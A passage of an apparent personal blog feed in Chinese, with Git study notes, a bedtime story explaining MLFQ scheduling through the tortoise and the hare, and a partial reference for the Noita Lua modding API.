title="修改commit描述内容"></a>修改commit描述内容</h3><p><code>git commit --amend -m &quot;Something_overwrite&quot;</code></p><h3 id="追加一点修改到上一次commit"><a href="#追加一点修改到上一次commit" class="headerlink" title="追加一点修改到上一次commit"></a>追加一点修改到上一次commit</h3><p>如果不想为了一点微小的改动增加一次commit，比如修改了一下a.c文件，就可以先把它加到暂存区，再<code>git commit --amend --no-edit</code></p><h3 id="gitignore"><a href="#gitignore" class="headerlink" title="gitignore"></a>gitignore</h3><p>某些文件不想提交上去，用此文件标记：<br><pre class="line-numbers language-none"><code class="language-none"># 忽略secret.yml文件secret.yml# 忽略config目录下的database.yml文件config&#x2F;database.yml# 忽略db目录下所有后缀是 .sqlite3的文件&#x2F;db&#x2F;*.sqlite3# 忽略所有后缀是 .tmp的文件*.tmp# 如果想要忽略.gitignore这个文件也可以，只是通常不会这么做# .gitignore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>git add -f 文件名称</code>中，f应该是force，要高过gitignore文件的效果</p><p>对创建前已经存在于暂存区的文件无效，需要用<code>git rm --cached</code>清出去</p><h3 id="出bug后的清算时间"><a href="#出bug后的清算时间" class="headerlink" title="出bug后的清算时间"></a>出bug后的清算时间</h3><p><code>git blame filename</code>可以看到每行代码最后修改于谁、哪次提交</p><h3 id="挽回"><a href="#挽回" class="headerlink" title="挽回"></a>挽回</h3><p><code>git checkout cinderella.html</code>将指定文件恢复回来，同样可以使用通配符：<code>git checkout .</code></p><p><code>git reset XXX</code>回退到XXX次提交，这个细节比较多</p><p>首先需要理解<code>HEAD</code>，它像一个指向分支的指针，一个提交历史可能像这样：<br><code>A-&gt;B-&gt;C</code>HEAD默认就指向C，表示接下来的修改接续在C后面</p><p>依据切换时是否舍弃工作目录、暂存区，reset分为三种模式，<code>git reset --soft</code>保留工作目录和暂存区的修改<code>git reset --mixed</code>，舍弃暂存区，保留工作目录（默认）和<code>git reset --hard</code>，丢弃所有未提交的改动</p><p><code>git reset HEAD^</code>中<code>^</code>表示前一次，这条指令的含义就是reset到前一次提交，这是相对定位，或者<code>git reset 85e7e30</code></p><p>commit不会因为reset消失，但会无法通过log查看，可以通过reflog获取一些信息<code>git reflog</code>展示HEAD移动信息</p><h3 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h3><p>SHA-1（Secure Hash Algorithm 1）是一种杂凑算法，计算之后的结果通常会以40个十六进制的数字形式呈现。该算法的特点之一，就是只要输入一样的值，就会有一样的输出值；反之，如果输入不同的值，就会有不同的输出值。Git中所有对象的编号都是靠这种算法产生的。</p><p>在Git中，不同种类对象的SHA-1值的计算方法会稍微有些不同。例如，Blob对象的SHA-1组成模式如下：</p><pre><code>（1）“blob”字样。（2）一个空白字节。（3）输入内容的长度。（4）Null结束符号。（5）输入内容。</code></pre><p>一个重要信息是与时间、设备等都无关，只与文件内容有关</p><h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><h3 id="四种对象"><a href="#四种对象" class="headerlink" title="四种对象"></a>四种对象</h3><p>在Git中，有4种很重要的对象，分别是Blob对象、Tree对象、Commit对象以及Tag对象。</p><p>Blob（Binary large object），对一个文件进行SHA-1后就可以存到git目录，得到的40个字符中，前两个作为目录，后38个作为文件名，文件内容是压缩过的，可以用<code>git cat-file -p 30ab28d3acb37f96ad61ad8be82c8da46d0a7307</code>查看，把<code>-p</code>换成<code>-t</code>可用来查询对象类型</p><p>重复：git只对“内容”有兴趣，察觉不到空目录</p><p>Tree，目录及文件的名称将以Tree对象的形式存放，Blob只存放文件内容。会形成一个有向无环图</p><p>Commit，记录了根目录tree对象，提交信息</p><p>总结：</p><p>（1）把文件加入Git之后，文件的内容会被转成Blob对象存储。</p><p>（2）目录及文件名会存放在Tree对象内，Tree对象会指向Blob对象或者其他的Tree对象。</p><p>（3）Commit对象会指向某个Tree对象。除了第一个Commit，其他的Commit都会指向前一次的Commit对象。</p><p>（4）Tag对象（Annotated Tag）会指向某个Commit对象。</p><p>（5）分支虽然不属于这4种对象之一，但它会指向某个Commit对象。</p><p>（6）往Git服务器上推送之后，在.git/refs下就会多出一个remote目录，里面放的是远端的分支，基本上与本地的分支类似，同样也会指向某个Commit对象。</p><p>（7）HEAD也不属于这4种对象之一，它会指向某个分支。</p><p>在checkout时，git会根据当前commit对象，把所有对象抽出来</p><h3 id="其它细节"><a href="#其它细节" class="headerlink" title="其它细节"></a>其它细节</h3><p>git不做差异备份，会浪费空间，有垃圾回收机制但空间不是git考虑的主要问题</p><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p><code>git branch</code>查看所有分支</p><p><code>git branch newBranch</code>新增一个分支（不切换）</p><p>给分支改名<code>git branch -m newBranch Auceptin</code>用-m参数</p><p>删除分支<code>git branch -d Auceptin</code>用-d参数，如果没合并会提示，换成-D强制执行。当前所在分支不能删，此外均可</p><p>切换分支<code>git checkout master</code>如果分支不存在，加上-b参数默认新建分支</p><p>分支从名字容易理解为项目的分叉，从实际实现上应当理解为一个贴纸，贴在commit上，被HEAD指向并移动。而其本质是40个字节（某个Commit的SHA-1值），所以新建分支开销极小，删掉分支也不会影响commit</p><p>合并分支<code>git merge Branch1</code>，效果是把Branch1合并到当前所在分支。如果有两个从master分出的分支a和b要合并，他们不存在谁是谁的子集，git就会新建一个commit再整合到一起（如果没有冲突）。有子集关系直接换贴纸就好了，或者加上<code>--no-ff</code>参数也会新增一个commit</p><p><code>git reset HEAD^ --hard</code>撤回</p><p>rebase合并<code>git rebase Branch</code>，把分叉以后得提交嫁接到Branch分支上，但是原本的分支并没有消失，只是不可达了</p><p>rebase的撤回不同，可以用reflog找回不可达的commit</p><p>回溯时间，回到以前的commit重新分叉，可以checkout后再commit，也可以<code>git branch bird 657fce7</code>，含义是在657fce7这个commit上新增一条名为bird的分支</p><h2 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h2><p>大致git呈现出的是这样的：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 我是Cat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>=======      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span> 我是Dog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>>>>>>>> dog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>先指明HEAD当前分支，===分割线，后面是另一个分支</p><p>把不想要的内容和标记删掉即可，然后重新加到暂存区并commit，如果是rebase就是git rebase —continue</p><p>如果是非文本文件，比如图片文件冲突，<code>git checkout --ours a.jpg</code>或者<code>git checkout --theirs a.jpg</code></p><h2 id="修改历史"><a href="#修改历史" class="headerlink" title="修改历史"></a>修改历史</h2><p>—amend参数可以修改最后一次commit，如果想回溯更久的历史，需要用git rebase</p><p><code>git rebase -i bb0c9c2</code>其中<code>-i</code>参数表示进入互动模式，范围是从bb0c9c2到当前提交。在互动模式的记录中，由上而下是从最旧到最新，与git log指令所呈现的结果是相反的。修改内容限于commit的描述信息，SHA-1值会全部改变</p><p><code>git reset ORIG_HEAD --hard</code>撤回</p><p>用图形化的界面要方便很多</p><p>合并多次提交：进入交互模式后，把pick改成squash就可以和上一个commit合并，commit信息重写</p><p>拆分，同上，把pick改成edit，git reset HEAD^然后重新加进暂存区、提交</p><p>revert reset 和 rebase</p><p>revert是新增一个commit，内容是还原到上一个commit，一种过于礼貌的修改，但是适用于已经push之后的修改</p><p>reset把当前状态设置为指定commit</p><p>rebase如上，功能丰富</p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>标签和branch一样也是指向commit的一个指向标，一般用于记录版本号等，做里程碑用</p><p>分为轻量标签和有附注的标签，添加轻量标签<code>git tag 1.0.0 51d54ff</code>把1.0.0标签贴到51d54ff这个commit上，默认加到当前commit。增加<code>-a</code>参数变为有附注的标签<code>-m &quot;something&quot;</code>标签增加内容，类似于commit</p><p>有附注的标签主要用作软件版本号等，而轻量标签则是用于个人使用或暂时标记。前者会记录谁在什么时候贴了这张标签，后者不会</p><p><code>git tag -d tag_name</code>用-d（delete）参数清理</p><p>标签与分支的区别是，分支会随着Commit而移动，但标签不会。</p><h2 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h2><h3 id="手边的工作做到一半，临时要切换到别的任务"><a href="#手边的工作做到一半，临时要切换到别的任务" class="headerlink" title="手边的工作做到一半，临时要切换到别的任务"></a>手边的工作做到一半，临时要切换到别的任务</h3><p>先提交已经完成的修改，切换分支，修改后<code>$ git reset HEAD^</code>回来</p><p>也可以用stash功能，暂存当前修改<code>git stash</code>然后用<code>git stash list</code>查看已经存的，用<code>git stash pop stash@&#123;2&#125;</code>这样一条指令恢复，默认0号stash，pop之后就没了</p><h3 id="提交了私密信息"><a href="#提交了私密信息" class="headerlink" title="提交了私密信息"></a>提交了私密信息</h3><p><del>掀桌子，删git目录</del></p><p>Rebase到提交前再逐个commit编辑，或者 <code>git filter-branch</code>批量编辑，比如<code>git filter-branch --tree-filter &quot;rm -f config/database.yml&quot;</code></p><p>撤回<code>git reset refs/original/refs/heads/master --hard</code></p><p>如果已经push上去了就只能 filter-branch后<code>git push-f</code></p><h3 id="资源回收"><a href="#资源回收" class="headerlink" title="资源回收"></a>资源回收</h3><p>文件进了git想走就困难了，首先要让对应commit不可达，即没有标签打在顶上或其根其它commit，然后还要让reflog也忘掉，默认三十天，或者<code>git reflog expire --all --expire=now</code></p><p><code>git fsck --unreachable</code>列出真正不可达的commit，<code>git gc</code>喊来垃圾车，但是依然不会立刻运走，而是等到过期<code>git gc --prune=now</code>才可以</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>设置远端节点<br><code>git remote add origin git@github.com:kaochenlong/practice-git.git</code>其中origin是个代名词，换成随便别的什么都可以</p><p>推送<code>git push -u origin master</code>，完成的工作是：</p><blockquote><p>（1）把master分支的内容推向origin位置。<br>（2）在origin远端服务器上，如果master不存在，就创建一个名为master的分支。<br>（3）如果服务器上存在master分支，就会移动服务器上master分支的位置，使它指到当前最新的进度上。</p></blockquote><p><code>-u</code>参数，表示upstream上游，。在Git中，每个分支可以设置一个上游（最多也只有一个）下次执行git push指令时，就会用它来当默认值，可以使用<code>git push</code>没有<code>origin main</code>了。</p><p><code>git fetch</code>只拉不合并</p><p><code>git pull</code>拉下来自动合并 = git fetch + git merge</p><p>冲突也是常有的，先拉再推是好习惯，<code>git push -f</code>强制推上去的话……至少代码的冲突解决了</p><p><code>git clone address</code>Clone指令通常只在第一次下载时使用，而之后的更新就只能使用Pull/Fetch指令了</p><p>PullRequest（PR）想参与一个项目但没有权限也要不到权限，可以：</p><blockquote><p>（1）先复制（Fork）一份原作者的项目到自己的GitHub账号下。<br>（2）因为复制的项目已经在自己的GitHub账号下，所以就有了完整的权限，可以随意更改。<br>（3）改完后，将自己账号下的项目推送（Push）上去。<br>（4）发个通知，让原作者知道你帮忙做了一些事情，请他看一下。<br>（5）原作者看完后如果觉得可以，就会把你做的这些修改合并（Merge）到他的项目中。<br>其中，步骤（4）中的那个“通知”，就是发送一个请原作者拉回去（Pull）的请求（Request），称为PR（Pull Request）。</p></blockquote><p>但是遇到进度落后会比较麻烦，重新fork有效好用但是比较笨，正确做法是把原作者的项目设置成上游项目，Fetch回来后再手动合并。</p><p><code>git push origin master:cat</code>把本地的master分支推上去之后，在服务器上创建cat分支，去掉master，<code>git push origin :cat</code>用空白区覆盖cat分支，实现了删除效果</p><p>在大型项目多人合作，分支如果不加以约定会变得十分混乱，于是有了git flow这种东西，规定每个分支的功能</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;内容来源：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;书名：Git从入门到精通&lt;/li&gt;
&lt;li&gt;作者：高见龙&lt;/li&gt;
&lt;li&gt;出版社：北京大学出版社&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="学习生活" scheme="https://aucept.in/categories/%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="git" scheme="https://aucept.in/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：龟兔赛跑</title>
    <link href="https://aucept.in/2025/08/05/%E9%BE%9F%E5%85%94%E8%B5%9B%E8%B7%91/"/>
    <id>https://aucept.in/2025/08/05/%E9%BE%9F%E5%85%94%E8%B5%9B%E8%B7%91/</id>
    <published>2025-08-05T14:21:57.000Z</published>
    <updated>2025-12-23T07:56:28.033Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个有关时间片分配的故事</p><p>从前，在名为os的森林里有两个进程，一个名兔子，它运行起来cpu一直在转；一只名乌龟，它经常要与其它设备交互，平均每个时间片只有1%在运算，而剩下的99%都在阻塞</p><p>某天，os将乌龟与兔子调度到了同一个cpu上，它们相约同时开始计算一个很大的哈希，比一比谁先返回。</p><p>起初，兔子和乌龟都在最高优先级的队列中，兔子、先拿到了一个时间片。几毫秒的时间里cpu飞快地运转，很快这个哈希值就要算完了，可惜时间片结束了，因为兔子一直在占用cpu，它的优先级被降低了一位。</p><p>接下来轮到了乌龟，乌龟每算几个字符都要阻塞很久，这不，刚才阻塞中恢复，时间片就结束了。因为cpu使用时间不长，乌龟的优先级没有降低。</p><p>下一个时间片到来了，兔子正摩拳擦掌准备一鼓作气算完，却发现os把时间片分给了乌龟——乌龟现在的优先级比兔子高</p><p>接下来兔子等啊等，希望某一次时间片结束时乌龟还在阻塞，这样它就能一举追回优势，然而乌龟慢吞吞地行动背后有着精妙的设计，每次时间片结束时都恰好刚从阻塞中恢复，开始cpu计算，于是时间片一直被把持着</p><p>兔子眼巴巴地盯着乌龟，就在它已接受即将饿死的事实时，突然，新一轮调度完成，兔子获得了一个时间片，惊喜中兔子奋力一冲，算完了这个哈希——但回头一看，进程表里哪里还有什么乌龟，它已经算完哈希结束了！</p><p>就像原版的故事中，兔子输掉不是因为跑得快，而是莫名其妙的贪睡设定一样，本文中兔子输掉也不是因为它cpu密集，而是简单的MLFQ策略确实存在着这样的漏洞，所以后续设计师们增加了更复杂的策略来避免，但在故事发生时，这还都不存在</p><p>望着空荡荡的进程表的兔子在想什么呢？快并不代表拥有，久等并不意味着机会，它说，它要学着顺应操作系统的规则</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;这是一个有关时间片分配的故事&lt;/p&gt;
&lt;p&gt;从前，在名为os的森林里有两个进程，一个名兔子，它运行起来cpu一直在转；一只名乌龟，它经常要与其它设备交互，平均每个时间片只有1%在运算，而剩下的99%都在阻塞&lt;/p&gt;
&lt;p&gt;某天，os将乌龟与兔子调度到了同一个cpu上，它们相</summary>
        
      
    
    
    
    <category term="睡前故事" scheme="https://aucept.in/categories/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
    
    <category term="睡前故事" scheme="https://aucept.in/tags/%E7%9D%A1%E5%89%8D%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>noita_api</title>
    <link href="https://aucept.in/2025/07/29/noita-api/"/>
    <id>https://aucept.in/2025/07/29/noita-api/</id>
    <published>2025-07-29T09:00:00.000Z</published>
    <updated>2025-10-04T05:16:55.559Z</updated>
    
    <content type="html"><![CDATA[<p><span style = "font-size: 30px; font-weight: 900">一个 noita API使用参考文档 </span></p><p>noita的api只提供了参数和返回值，大多都没写具体效果，<a href="https://noita.wiki.gg/zh/wiki/Mod:Lua_API">noita wiki</a>里的差点意思，故有本文</p><p>lua_api_documentation.txt文件版本：<code>Current modding API version: 12</code>，共注明了405个，其中16个注明deprecated，本文忽略,当前进度：208/389</p><div class="note danger flat"><p>开销测量因环境与上下文而异，仅供参考</p></div><h2 id="调试相关"><a href="#调试相关" class="headerlink" title="调试相关"></a>调试相关</h2><h3 id="GamePrint"><a href="#GamePrint" class="headerlink" title="GamePrint"></a><code>GamePrint</code></h3><blockquote><p>GamePrint( log_line:string )</p></blockquote><p>参数是一个字符串（数字也可以），效果为在游戏左下角输出，测得开销约为0.9秒/百万次。noita每秒60帧，也就是每帧16毫秒，不到20000次输出</p><p>属于比较轻量的输出，每帧调用几千次不会造成明显影响</p><h3 id="GamePrintImportant"><a href="#GamePrintImportant" class="headerlink" title="GamePrintImportant"></a><code>GamePrintImportant</code></h3><blockquote><p>GamePrintImportant( title:string, description:string = “”, ui_custom_decoration_file:string = “” )</p></blockquote><p>三个字符串参数，标题、描述和ui装饰</p><p>第一个显示在框里，触怒神明等，第二个显示在框下，第三个改变框的ui，默认为触怒神明时的那种，需要一个图片的路径，如：”data/ui_gfx/decorations/3piece_fungal_shift.png”可以换为真菌转化的ui</p><p>有几秒的固定持续时间，不会被后来的覆盖掉，超出一定时间限制的会被丢弃</p><h3 id="GameGetRealWorldTimeSinceStarted"><a href="#GameGetRealWorldTimeSinceStarted" class="headerlink" title="GameGetRealWorldTimeSinceStarted"></a><code>GameGetRealWorldTimeSinceStarted</code></h3><blockquote><p>GameGetRealWorldTimeSinceStarted() -&gt; number</p></blockquote><p>返回自游戏开始的时间，单位是秒，小数点后保留7位</p><h3 id="GameGetFrameNum"><a href="#GameGetFrameNum" class="headerlink" title="GameGetFrameNum"></a><code>GameGetFrameNum</code></h3><blockquote><p>GameGetFrameNum() -&gt; int</p></blockquote><p>返回一个整数，游戏开始到当前的帧数（每秒上限60帧）</p><h3 id="GameGetDateAndTimeUTC"><a href="#GameGetDateAndTimeUTC" class="headerlink" title="GameGetDateAndTimeUTC"></a><code>GameGetDateAndTimeUTC</code></h3><blockquote><p>GameGetDateAndTimeUTC() -&gt; year:int,month:int,day:int,hour:int,minute:int,second:int</p></blockquote><p>返回六个整数，获取UTC日期时间</p><h3 id="GameGetDateAndTimeLocal"><a href="#GameGetDateAndTimeLocal" class="headerlink" title="GameGetDateAndTimeLocal"></a><code>GameGetDateAndTimeLocal</code></h3><blockquote><p>GameGetDateAndTimeLocal() -&gt;year:int,month:int,day:int,hour:int,minute:int,second:int</p></blockquote><p>同上，获取本地时间</p><h3 id="SetTimeOut"><a href="#SetTimeOut" class="headerlink" title="SetTimeOut"></a><code>SetTimeOut</code></h3><blockquote><p>SetTimeOut( time_to_execute:number, file_to_execute:string, function_to_call:string = nil )</p></blockquote><p>%rdi秒后执行，参数为：时间（秒），文件路径（绝对路径），要执行的文件里的函数名</p><p>使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">SetTimeOut</span><span class="token punctuation">(</span> <span class="token number">0.54</span><span class="token punctuation">,</span> <span class="token string">"data/scripts/buildings/egg_damage.lua"</span><span class="token punctuation">,</span> <span class="token string">"impl_spawn_boss_dragon"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>注1：此函数运行是非阻塞的，即执行到该函数时开始计时并立刻返回，计时完成后执行函数</p><p>注2：此函数具备跨存档特性，只要时间到了就执行，即使已经新开了一局（如果函数还能找到的话）</p><h3 id="SetWorldSeed"><a href="#SetWorldSeed" class="headerlink" title="SetWorldSeed"></a><code>SetWorldSeed</code></h3><blockquote><p>SetWorldSeed( new_seed:int )</p></blockquote><p>设置世界的种子</p><h3 id="SetPlayerSpawnLocation"><a href="#SetPlayerSpawnLocation" class="headerlink" title="SetPlayerSpawnLocation"></a><code>SetPlayerSpawnLocation</code></h3><blockquote><p>SetPlayerSpawnLocation( x:number, y:number )</p></blockquote><p>设置出生点，输入坐标</p><h3 id="SetRandomSeed"><a href="#SetRandomSeed" class="headerlink" title="SetRandomSeed"></a><code>SetRandomSeed</code></h3><blockquote><p>SetRandomSeed( x:number, y:number )</p></blockquote><p>设置随机种子，参数选择坐标、时间、实体id或无意义数字等均可</p><h3 id="DEBUG-GetMouseWorld"><a href="#DEBUG-GetMouseWorld" class="headerlink" title="DEBUG_GetMouseWorld"></a><code>DEBUG_GetMouseWorld</code></h3><blockquote><p>DEBUG_GetMouseWorld() -&gt; x:number,y:number</p></blockquote><p>获取鼠标在世界地图上的坐标，返回一对坐标</p><h3 id="DEBUG-MARK"><a href="#DEBUG-MARK" class="headerlink" title="DEBUG_MARK"></a><code>DEBUG_MARK</code></h3><blockquote><p>DEBUG_MARK( x:number, y:number, message:string = “”, color_r:number = 1, color_g:number = 0, color_b:number = 0 )</p></blockquote><p>标记，输入在屏幕上的坐标，字符串，颜色（RGB）</p><h2 id="实体Entity……"><a href="#实体Entity……" class="headerlink" title="实体Entity……"></a>实体Entity……</h2><h3 id="EntityLoad"><a href="#EntityLoad" class="headerlink" title="EntityLoad"></a><code>EntityLoad</code></h3><blockquote><p>EntityLoad( filename:string, pos_x:number = 0, pos_y:number = 0 ) -&gt; entity_id:int</p></blockquote><p>生成一个实体，参数为一个xml文件路径和两个坐标，返回entity_id，实体的标识符，可以以此跟踪该实体</p><p>生成开销（每百次毫秒级）远小于后续计算实体行为开销</p><p>生物数量有上限：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CameraBoundComponent</span>         <span class="token attr-name">max_count</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span>        <span class="token attr-name">distance</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>160000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CameraBoundComponent</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>在相机界限组件内定义</p><h3 id="EntityLoadEndGameItem"><a href="#EntityLoadEndGameItem" class="headerlink" title="EntityLoadEndGameItem"></a><code>EntityLoadEndGameItem</code></h3><blockquote><p>EntityLoadEndGameItem( filename:string, pos_x:number = 0, pos_y:number = 0 ) -&gt; entity_id:int</p></blockquote><p>一个很神秘的api，测试中和EntityLoad基本一致，游戏中唯一可见的用法是：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">Random</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token keyword">then</span><span class="token function">EntityLoadEndGameItem</span><span class="token punctuation">(</span> <span class="token string">"data/entities/animals/boss_centipede/sampo.xml"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">return</span> <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>该函数效果是会在正常生成sampo之后再生成一个宝箱</p><h3 id="EntityKill"><a href="#EntityKill" class="headerlink" title="EntityKill"></a><code>EntityKill</code></h3><blockquote><p>EntityKill( entity_id:int )</p></blockquote><p>清除指定id的实体，无尸体、无掉落</p><h3 id="EntityCreateNew"><a href="#EntityCreateNew" class="headerlink" title="EntityCreateNew"></a><code>EntityCreateNew</code></h3><blockquote><p>EntityCreateNew( name:string = “” ) -&gt; entity_id:int</p></blockquote><p>创建一个实体，参数为实体名，可留空，返回id，搭配其它操作实体的函数使用，例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- add ui icon etc</span><span class="token keyword">local</span> entity_ui <span class="token operator">=</span> <span class="token function">EntityCreateNew</span><span class="token punctuation">(</span> <span class="token string">""</span> <span class="token punctuation">)</span><span class="token function">EntityAddComponent</span><span class="token punctuation">(</span> entity_ui<span class="token punctuation">,</span> <span class="token string">"UIIconComponent"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> name <span class="token operator">=</span> essence_name<span class="token punctuation">,</span>description <span class="token operator">=</span> essence_desc<span class="token punctuation">,</span>icon_sprite_file <span class="token operator">=</span> ui_icon<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token function">EntityAddTag</span><span class="token punctuation">(</span> entity_ui<span class="token punctuation">,</span> <span class="token string">"essence_effect"</span> <span class="token punctuation">)</span><span class="token function">EntityAddChild</span><span class="token punctuation">(</span> entity_who_picked<span class="token punctuation">,</span> entity_ui <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="EntityLoadCameraBound"><a href="#EntityLoadCameraBound" class="headerlink" title="EntityLoadCameraBound"></a><code>EntityLoadCameraBound</code></h3><blockquote><p>EntityLoadCameraBound( filename:string, pos_x:number = 0, pos_y:number = 0 )</p></blockquote><p>输入一个xml路径，一对坐标，不返回实体id。在对应坐标处生成一个指定实体，除无返回值外未观察到与EntityLoad的区别，开销相近，游戏文件中不常见</p><h3 id="EntityGetWithTag"><a href="#EntityGetWithTag" class="headerlink" title="EntityGetWithTag"></a><code>EntityGetWithTag</code></h3><blockquote><p>EntityGetWithTag( tag:string ) -&gt; {entity_id:int} <strong>[Returns all entities with ‘tag’.]</strong></p></blockquote><p>获取带有指定标签的实体，参数是标签，nolla备注说返回的是所有实体（id）</p><p>tags可以在实体的xml文件里看到：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span>   <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG_NAME:player<span class="token punctuation">"</span></span>  <span class="token attr-name">tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mortal,human,hittable,peasant,prey,player_unit,teleportable<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>寻找玩家就可以：</p><blockquote><p>EntityGetWithTag( “player_unit” )<br>得到玩家表，第一项即玩家的实体id</p></blockquote><p>有一定的检测范围，大于视野很多</p><h3 id="EntityGetInRadius"><a href="#EntityGetInRadius" class="headerlink" title="EntityGetInRadius"></a><code>EntityGetInRadius</code></h3><blockquote><p>EntityGetInRadius( pos_x:number, pos_y:number, radius:number ) -&gt; {entity_id:int} [Returns all entities in ‘radius’ distance from ‘x’,’y’.]</p></blockquote><p>输入坐标和半径，返回所有实体id。检测范围存在上限，半径约为1000像素（有待精确测量）</p><h3 id="EntityGetInRadiusWithTag"><a href="#EntityGetInRadiusWithTag" class="headerlink" title="EntityGetInRadiusWithTag"></a><code>EntityGetInRadiusWithTag</code></h3><blockquote><p>EntityGetInRadiusWithTag( pos_x:number, pos_y:number, radius:number, entity_tag:string ) -&gt; {entity_id:int} [Returns all entities in ‘radius’ distance from ‘x’,’y’.]</p></blockquote><p>输入一对坐标，实体id和一个标签，前两个的结合</p><h3 id="EntityGetClosest"><a href="#EntityGetClosest" class="headerlink" title="EntityGetClosest"></a><code>EntityGetClosest</code></h3><blockquote><p>EntityGetClosest( pos_x:number, pos_y:number ) -&gt; entity_id:int</p></blockquote><p>获取具体给定坐标最近的实体id，输入一对坐标，返回id</p><h3 id="EntityGetClosestWithTag"><a href="#EntityGetClosestWithTag" class="headerlink" title="EntityGetClosestWithTag"></a><code>EntityGetClosestWithTag</code></h3><blockquote><p>EntityGetClosestWithTag(  pos_x:number, pos_y:number, tag:string ) -&gt; entity_id:int</p></blockquote><p>获取最近的带有某标签的实体，输入坐标、标签，返回id</p><h3 id="EntityGetWithName"><a href="#EntityGetWithName" class="headerlink" title="EntityGetWithName"></a><code>EntityGetWithName</code></h3><blockquote><p>EntityGetWithName( name:string ) -&gt; entity_id:int</p></blockquote><p>输入name，返回id。name类似于以下，是实体的名字，受汉化影响。（此api在游戏文件里一次也没用过）<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$projectile_default<span class="token punctuation">"</span></span> <span class="token attr-name">tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>projectile_player<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Entity</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="EntityGetTransform"><a href="#EntityGetTransform" class="headerlink" title="EntityGetTransform"></a><code>EntityGetTransform</code></h3><blockquote><p>EntityGetTransform( entity_id:int ) -&gt; x:number,y:number,rotation:number,scale_x:number,scale_y:number</p></blockquote><p>用于获取实体位置，输入实体id</p><p>前俩返回值是坐标，rotation是贴图的旋转角度，单位是弧度，0为正，顺时针，scale_x和y是贴图的缩放倍数，负数为翻转</p><h3 id="EntitySetTransform"><a href="#EntitySetTransform" class="headerlink" title="EntitySetTransform"></a><code>EntitySetTransform</code></h3><blockquote><p>EntitySetTransform( entity_id:int, x:number, y:number = 0, rotation:number = 0, scale_x:number = 1, scale_y:number = 1 